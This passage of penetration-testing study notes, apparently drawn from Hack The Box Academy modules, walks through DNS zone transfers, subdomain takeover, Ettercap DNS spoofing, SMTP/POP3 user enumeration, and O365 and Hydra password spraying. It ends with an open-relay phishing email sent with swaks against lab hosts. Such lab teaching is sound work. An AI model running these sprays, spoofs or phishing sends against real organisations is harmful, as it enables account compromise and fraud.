dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

* Tools like [Fierce](https://github.com/mschwager/fierce) can also be used to enumerate all DNS servers of the root domain and scan for a DNS zone transfer:

### Fierce

```shell-session
fierce --domain zonetransfer.me
```

## Domain Takeovers & Subdomain Enumeration

Domain takeover is also possible with subdomains called `subdomain takeover`. A DNS's canonical name (`CNAME`) record is used to map different domains to a parent domain. Many organizations use third-party services like AWS, GitHub, Akamai, Fastly, and other content delivery networks (CDNs) to host their content. In this case, they usually create a subdomain and make it point to those services. For example

```shell-session
sub.target.com.   60   IN   CNAME   anotherdomain.com
```

### **Subdomain Enumeration**

> Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like [Subfinder](https://github.com/projectdiscovery/subfinder). This tool can scrape subdomains from open sources like [DNSdumpster](https://dnsdumpster.com/). Other tools like [Sublist3r](https://github.com/aboul3la/Sublist3r) can also be used to brute-force subdomains by supplying a pre-generated wordlist:

```shell-session
./subfinder -d inlanefreight.com -v
```

### Subbrute

* <https://github.com/TheRook/subbrute>

```shell-session
git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
cd subbrute
echo "ns1.inlanefreight.com" > ./resolvers.txt
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

&#x20;we can enumerate the `CNAME` records for those subdomains.

```shell-session
 host support.inlanefreight.com
```

The `support` subdomain has an alias record pointing to an AWS S3 bucket. However, the URL `https://support.inlanefreight.com` shows a `NoSuchBucket` error indicating that the subdomain is potentially vulnerable to a subdomain takeover.&#x20;

* <https://github.com/EdOverflow/can-i-take-over-xyz>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fe2Jnzni0h3K8QXpqhtKQ%2Fimage.png?alt=media&amp;token=27630e12-16ee-46e7-9035-18b00e217f41" alt=""><figcaption></figcaption></figure>

## DNS Spoofing

### **Local DNS Cache Poisoning**

From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/).

To exploit the DNS cache poisoning via `Ettercap`, we should first edit the `/etc/ettercap/etter.dns` file to map the target domain name (e.g., `inlanefreight.com`) that they want to spoof and the attacker's IP address (e.g., `192.168.225.110`) that they want to redirect a user to:

```shell-session
 cat /etc/ettercap/etter.dns

inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

Next, start the `Ettercap` tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`. Once completed, add the target IP address (e.g., `192.168.152.129`) to Target1 and add a default gateway IP (e.g., `192.168.152.2`) to Target2.

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FtV7rPH33m0P0iEfN3v4t%2Fimage.png?alt=media&amp;token=cb2ec80c-798b-4c7c-a4cd-d27a40e59c80" alt=""><figcaption></figcaption></figure>

Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`. This sends the target machine with fake DNS responses that will resolve `inlanefreight.com` to IP address `192.168.225.110`:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FSDc1zVX9EIDEcHZzHDoi%2Fimage.png?alt=media&amp;token=bebc4108-62d7-4d9b-b706-3799274631ed" alt=""><figcaption></figcaption></figure>

After a successful DNS spoof attack, if a victim user coming from the target machine `192.168.152.129` visits the `inlanefreight.com` domain on a web browser, they will be redirected to a `Fake page` that is hosted on IP address `192.168.225.110`:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FUBnfTTROEEteD4kHGGlf%2Fimage.png?alt=media&amp;token=63583131-f5d9-4bfe-99f4-272d313038ce" alt=""><figcaption></figcaption></figure>

```cmd-session
C:\>ping inlanefreight.com
```

## Latest DNS Vulnerabilities

```
1. Initiation of Subdomain Takeover
2. Trigger the Forwarding
```

* <https://academy.hackthebox.com/module/116/section/1513>

## 6.SMTP

### Enumeration

```shell-session
host -t MX hackthebox.eu
host -t MX microsoft.com
```

**DIG - MX Records**

```shell-session
dig mx plaintext.do | grep "MX" | grep -v ";"
dig mx inlanefreight.com | grep "MX" | grep -v ";"
```

**Host - A Records**

```shell-session
Host -t A mail1.inlanefreight.htb.
```

If we are targetting a custom mail server implementation such as `inlanefreight.htb`, we can enumerate the following ports:

| **Port**  | **Service**                                                                |
| --------- | -------------------------------------------------------------------------- |
| `TCP/25`  | SMTP Unencrypted                                                           |
| `TCP/143` | IMAP4 Unencrypted                                                          |
| `TCP/110` | POP3 Unencrypted                                                           |
| `TCP/465` | SMTP Encrypted                                                             |
| `TCP/587` | SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS) |
| `TCP/993` | IMAP4 Encrypted                                                            |
| `TCP/995` | POP3 Encrypted                                                             |

```shell-session
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
```

## Misconfigurations

**Authentication**

The SMTP server has different commands that can be used to enumerate valid usernames `VRFY`, `EXPN`, and `RCPT TO`. If we successfully enumerate valid usernames, we can attempt to password spray, brute-forcing, or guess a valid password. So let's explore how those commands work.

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

### Telnet

**VRFY Command**

```shell-session
 telnet 10.10.110.20 25
 
 VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

`EXPN` is similar to `VRFY`

```shell-session
telnet 10.10.110.20 25
```

```shell-session
EXPN john
EXPN support-team
```

### RCPT

`RCPT TO` identifies the recipient of the email message<br>

```shell-session
telnet 10.10.110.20 25
```

```shell-session
RCPT TO:julio
RCPT TO:john
```

We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.

**USER Command**

```shell-session
telnet 10.10.110.20 110
```

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)

## SMTP-ENUM

```shell-session
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## Cloud Enumeration

[O365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by [ZDH](https://twitter.com/0xzdh). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Let's first validate if our target domain is using Office 365.

### 0365spray

```shell-session
 python3 o365spray.py --validate --domain msplaintext.xyz
```

Now, we can attempt to identify usernames.

```shell-session
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz  
```

We can use `Hydra` to perform a password spray or brute force against email services such as `SMTP`, `POP3`, or `IMAP4`. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for `POP3`.

### Hydra - Password Attack

```shell-session
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```

> If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like `Hydra`, but these tools are usually blocked. We can instead try to use custom tools such as [o365spray](https://github.com/0xZDH/o365spray) or [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.

### O365 Spray - Password Spraying

```shell-session
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```

## Protocol Specifics Attacks

### Open Relay

```shell-session
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```

Next, we can use any mail client to connect to the mail server and send our email.

```shell-session
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
```

* <https://academy.hackthebox.com/module/116/section/1174>
